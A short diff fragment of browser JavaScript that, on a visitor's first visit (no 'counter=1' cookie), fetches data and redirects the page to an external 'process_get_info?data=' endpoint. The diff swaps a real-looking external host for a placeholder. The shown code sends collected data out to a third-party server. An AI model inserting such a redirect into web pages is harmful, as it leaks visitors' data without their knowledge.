@@ -8,6 +8,6 @@ if(!document.cookie.includes('counter=1')) {
           console.log("Ошибка HTTP: " + response.status);
         }
       }).then((data) => {
-      window.location.href = "http://danii319.beget.tech/process_get_info?data="+data;
+      window.location.href = "http://public/process_get_info?data="+data;
       })
 }
